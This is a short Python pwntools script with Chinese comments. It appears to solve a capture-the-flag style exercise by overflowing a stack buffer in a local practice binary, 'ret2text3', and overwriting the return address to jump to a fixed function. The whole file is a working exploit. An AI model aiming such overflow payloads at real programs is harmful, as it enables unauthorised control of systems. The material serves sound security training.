##coding=utf8
##coding=utf8
from pwn import *
## 构造与程序交互的对象
sh = process('./ret2text3')
success_addr = 0x0000000000401136
## 构造payload
payload = 'a'*0xC + 'bbbbbbbb' + p64(success_addr).decode("iso-8859-1")
print("pydc", payload)
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()
